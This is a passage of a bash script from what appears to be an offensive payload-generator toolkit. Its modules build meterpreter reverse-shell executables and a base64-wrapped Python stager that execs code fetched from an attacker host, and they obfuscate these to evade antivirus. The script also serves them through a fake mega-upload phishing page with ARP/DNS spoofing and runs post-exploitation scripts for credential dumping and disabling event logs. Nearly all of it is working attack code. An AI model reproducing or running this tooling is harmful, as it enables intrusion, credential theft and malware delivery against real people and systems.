iCn=$(zenity --list --title "☠ REPLACE AGENT ICON ☠" --text "\nChose icon to use:" --radiolist --column "Pick" --column "Option" TRUE "Windows-Store.ico" FALSE "Windows-Logo.ico" FALSE "Microsoft-Word.ico" FALSE "Microsoft-Excel.ico" --width 320 --height 240) > /dev/null 2>&1

       #
       # TODO: check if executes on windows systems
       # http://zitstif.no-ip.org/?p=882
       #
       # install pycrypto
       # wine msiexec /i pycrypto-2.3.win32-py2.6.msi
       # try to crypt pyinstaller with --key MySuperSecretPassword
       # http://sparkandshine.net/build-a-windows-executable-from-python-scripts-on-linux/
       # http://tzutalin.blogspot.pt/2016/12/make-python-program-executable-and.html
       # https://github.com/d3m3vilurr/Veil/blob/master/modules/common/supportfiles.py
       #
       xterm -T " PYINSTALLER " -geometry 110x23 -e "su $user -c '$arch c:/$PyIn/Python.exe c:/$PiWiN/pyinstaller.py --noconsole -i $IPATH/bin/icons/$iCn --onefile $IPATH/output/template.py'"
       cp $IPATH/output/dist/template.exe $IPATH/output/$N4m.exe
       rm $IPATH/output/*.spec > /dev/null 2>&1
       rm $IPATH/output/*.log > /dev/null 2>&1
       rm -r $IPATH/output/dist > /dev/null 2>&1
       rm -r $IPATH/output/build > /dev/null 2>&1
     else
      echo "[☠] pyinstaller not found .."
      exit
     fi


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.exe\n\nchose how to deliver: $N4m.exe" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 320) > /dev/null 2>&1


  if [ "$P0" = "Invoke-Phantom.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.exe|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.exe $ApAcHe/$N4m.exe > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.exe $ApAcHe/$N4m.exe
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
          else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'"
          fi
        fi
   fi


else


  echo "[x] Abort execution .."
  sleep 2
fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.exe > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}





# ------------------------------
# C - AVET to EXE shellcode  FUD 
# ------------------------------
sh_shellcode24 () {
# module description
cat << !

    ╔─────────────────────────────────────────────────────────────╗
    |   This module uses AVET to obfuscate sourcecode (evade AV)  |
    |   Author: Daniel Sauder (Blackhat USA Edition 2017)         |
    |                                                             |
    |  Detection ratio:                                           |
    |  https://nodistribute.com/result/ENZ1b6R2TrYocWHCzy9fwMuQs  |
    ╚─────────────────────────────────────────────────────────────╝

!
sleep 2
# run module or abort ? 
QuE=$(zenity --question --title="☠ AVET AV evasion ☠" --text "Author: Daniel Sauder\nRun avet module?" --width 240) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
#
# Check if dependencies are installed ..
# check if MinGw EXE exists ..
#
which mingw-gcc > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
  echo "[☠] MinGw EXE compiler found .."
  sleep 2
else
  echo "[x] MinGw EXE compiler not found .."
  sleep 2
    #
    # check if files/directory exist ..
    #
    if [ -e "/usr/bin/mingw-gcc" ]; then
      rm /usr/bin/mingw-gcc > /dev/null 2>&1
    fi
    if [ -d "$DrIvC/MinGW" ]; then
      rm -r $DrIvC/MinGW > /dev/null 2>&1
    fi
    echo "[☠] Installing MinGw EXE compiler .."
    cd $IPATH/obfuscate/
    xterm -T "Donwloading MinGw EXE compiller" -geometry 124x26 -e "wget https://downloads.sourceforge.net/project/mingw/Installer/mingw-get-setup.exe"
    xterm -T "Installing MinGw EXE compiller" -geometry 124x26 -e "$arch mingw-get-setup.exe"
  #
  # Building minGW diectory ..
  #
  echo "#!/bin/sh" >> /usr/bin/mingw-gcc
  echo "cd $DrIvC/MinGW/bin" >> /usr/bin/mingw-gcc
  echo "exec wine gcc.exe \"\$@\"" >> /usr/bin/mingw-gcc
  chmod +x /usr/bin/mingw-gcc
  echo "[✔] Done installing MinGW .."
  rm mingw-get-setup.exe > /dev/null 2>&1
  cd $IPATH/
  sleep 2
fi
#
# Install avet obfuscated software ..
#
if [ -e "$IPATH/obfuscate/avet/make_avet" ]; then
  echo "[☠] avet obfuscator found .."
  sleep 2
else
  echo "[x] avet obfuscator not found .."
  sleep 2
  echo "[☠] Installing avet software .."
  sleep 1
    #
    # build avet ..
    #
    if [ -d $IPATH/obfuscate/avet ]; then
      rm -r $IPATH/obfuscate/avet > /dev/null 2>&1
    fi
    cd $IPATH/obfuscate/
    xterm -T "Installing avet software" -geometry 124x26 -e "git clone https://github.com/govolution/avet.git && sleep 2"
  #
  # Build avet files ..
  #
  cd $IPATH/obfuscate/avet
  gcc make_avet.c -o make_avet
  gcc sh_format.c -o sh_format
  echo "[✔] Done installing avet .."
  sleep 2
  cd $IPATH/
fi


#
# Get user input to build shellcode ..
#
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
interactions=$(zenity --title="☠ Enter ENCODER interactions ☠" --text "example: 3" --entry --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 290) > /dev/null 2>&1


echo "[☠] Building shellcode -> C format .."
sleep 2
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| FORMAT  : C -> WINDOWS(EXE)
|_PAYLOAD : $paylo

!
#
# Use metasploit to build shellcode (msf encoded)
# https://nodistribute.com/result/YCHgomiEkJrI3BcbtjvGsuexKVp842 (3/39) with -i 3
# https://nodistribute.com/result/ENZ1b6R2TrYocWHCzy9fwMuQs (0/39) FUD with -F -E
#
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -e x86/shikata_ga_nai -i $interactions -f c -o $IPATH/obfuscate/avet/template.txt"


echo ""
# display generated code
cat $IPATH/obfuscate/avet/template.txt
echo "" && echo ""
sleep 2


# EDITING/BACKUP FILES NEEDED
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
echo "[☠] Editing/backup files .."
sleep 2


#
# We can reuse the template.txt from the previous example for decoding the shellcode:
#
echo "[☠] Decoding shellcode with avet .."
sleep 2
cd $IPATH/obfuscate/avet
if [ -e "$IPATH/obfuscate/avet/defs.h" ]; then
  rm $IPATH/obfuscate/avet/defs.h > /dev/null 2>&1
fi
#
# (decoding/obfuscation)
#
xterm -T "DECODING/OBFUSCATING SOURCECODE" -geometry 110x20 -e "./format.sh template.txt > scclean.txt && sleep 2"
rm $IPATH/obfuscate/avet/template.txt
mv scclean.txt template.txt
echo "[☠] Obfuscating shellcode with avet .."
sleep 1
./make_avet -f template.txt -F -E
echo "[☠] Compiling shellcode to exe .."
sleep 2
sudo mingw-gcc -o $IPATH/output/$N4m.exe $IPATH/obfuscate/avet/avet.c -lws2_32 -mwindows
cd $IPATH/
sleep 2


#
# CHOSE HOW TO DELIVER YOUR PAYLOAD
#
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.exe\n\nchose how to deliver: $N4m.exe" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 320) > /dev/null 2>&1


  if [ "$P0" = "Invoke-Phantom.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.exe|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.exe $ApAcHe/$N4m.exe > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.exe $ApAcHe/$N4m.exe
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
          else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi


else


  echo "[x] Abort execution .."
  sleep 2
fi

# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files .."
sleep 2
rm $ApAcHe/$N4m.exe > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
# cleanup avet old files ..
rm $IPATH/obfuscate/avet/template.txt > /dev/null 2>&1
rm $IPATH/obfuscate/avet/defs.h > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}








# ------------------------------
# PYTHON - UUID+BASE64 encoding
# ------------------------------
sh_shellcode26 () {
# module description
cat << !

    ╔─────────────────────────────────────────────────────────────╗
    |This module uses random UUIDkeys to evade signature detection|
    |                                                             |
    |  Detection ratio:                                           |
    |  https://nodistribute.com/result/9zMSmqJkyouWjUw            |
    ╚─────────────────────────────────────────────────────────────╝

!
sleep 2
# run module or abort ? 
QuE=$(zenity --question --title="☠ UUID random keys evasion ☠" --text "Author: r00t-3xp10it/null-byte\nRun uuid module?" --width 240) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1


echo "[☠] Building shellcode -> PYTHON format .."
sleep 2
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| FORMAT  : PYTHON -> MULTI OS
|_PAYLOAD : python/meterpreter/reverse_tcp

!


# EDITING/BACKUP FILES NEEDED
echo "[☠] editing/backup files .."
sleep 2


#
# Template ramdom keys ..
# HINT: adding ramdom comments to source code
# will help evading AVs signature detection (nullbite) 
# "a computer can never outsmart a always changing virus" 
#
NEW_UUID_1=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
NEW_UUID_2=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
NEW_UUID_3=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
NEW_UUID_4=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
NEW_UUID_5=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
NEW_UUID_6=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)


#
# Build python Template (random UUID keys)
#
cd $IPATH/output
echo "[✔] Using random UUID keys (evade signature detection)"
sleep 2
echo "[☠] build routine (raw) .."
sleep 2
echo "import socket,struct,time" > routine
echo "# $NEW_UUID_1" >> routine
echo "for x in range(10):" >> routine
echo "# $NEW_UUID_2" >> routine
echo "	try:" >> routine
echo "# $NEW_UUID_3" >> routine
echo "		s=socket.socket(2,socket.SOCK_STREAM)" >> routine
echo "# $NEW_UUID_4" >> routine
echo "		s.connect(('$lhost',$lport))" >> routine
echo "# $NEW_UUID_5" >> routine
echo "		break" >> routine
echo "# $NEW_UUID_6" >> routine
echo "	except:" >> routine
echo "# $NEW_UUID_1" >> routine
echo "		time.sleep(5)" >> routine
echo "# $NEW_UUID_2" >> routine
echo "l=struct.unpack('>I',s.recv(4))[0]" >> routine
echo "# $NEW_UUID_3" >> routine
echo "d=s.recv(l)" >> routine
echo "# $NEW_UUID_4" >> routine
echo "while len(d)<l:" >> routine
echo "# $NEW_UUID_5" >> routine
echo "	d+=s.recv(l-len(d))" >> routine
echo "# $NEW_UUID_6" >> routine
echo "exec(d,{'s':s})" >> routine



#
# base64 routine encoding
#
echo "[☠] base64 routine encoding .."
sleep 2
enc=`cat routine`
store=`echo "$enc" | base64 | tr -d '\n'`



#
# build template.py (final agent)
#
echo "[☠] build base64 $N4m.py agent .."
sleep 2
echo "# python  template | Author: r00t-3xp10it" > $IPATH/output/template.py
echo "# UUID obfuscation by: null-byte" >> $IPATH/output/template.py
echo "# execute: python $N4m.py" >> $IPATH/output/template.py
echo "# ---" >> $IPATH/output/template.py
echo "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('$store')))" >> $IPATH/output/template.py



#
# make the file 'executable' ..
#
mv template.py $N4m.py > /dev/null 2>&1
chmod +x $N4m.py > /dev/null 2>&1



#
# CHOSE HOW TO DELIVER YOUR PAYLOAD
#
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.py\n\nchose how to deliver: $N4m.py" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_linux.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 350) > /dev/null 2>&1



  if [ "$P0" = "Invoke-Phantom.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      #
      # TODO: if used IEXdownload() in Invoke-Phant0m.rb then
      # sed "s|RePlAcE|$lhost|" Invoke-Phant0m.rb > copy.rb
      # mv $IPATH/aux/copy.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      #
